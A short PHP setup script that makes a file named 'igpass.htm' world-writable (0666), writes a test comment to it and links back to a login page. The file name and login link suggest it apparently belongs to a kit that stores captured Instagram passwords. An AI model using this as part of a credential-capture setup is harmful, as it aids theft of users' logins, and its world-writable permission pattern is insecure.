<?php
// Make igpass.htm writable
if (file_exists('igpass.htm')) {
    // Check if file is writable
    if (!is_writable('igpass.htm')) {
        // Try to make it writable
        if (!chmod('igpass.htm', 0666)) {
            echo "Failed to make igpass.htm writable. Please set permissions manually.<br>";
        } else {
            echo "Successfully made igpass.htm writable.<br>";
        }
    } else {
        echo "igpass.htm is already writable.<br>";
    }
} else {
    echo "igpass.htm does not exist.<br>";
}

// Test if we can write to the file
$testWrite = @fopen('igpass.htm', 'a');
if ($testWrite) {
    fwrite($testWrite, "<!-- Permission test successful: " . date('Y-m-d H:i:s') . " -->\n");
    fclose($testWrite);
    echo "Successfully wrote to igpass.htm.<br>";
} else {
    echo "Failed to write to igpass.htm. Please check server permissions.<br>";
}
?>

<p>Once permissions are set, delete this file for security.</p>
<p><a href="index.php">Return to the login page</a></p> 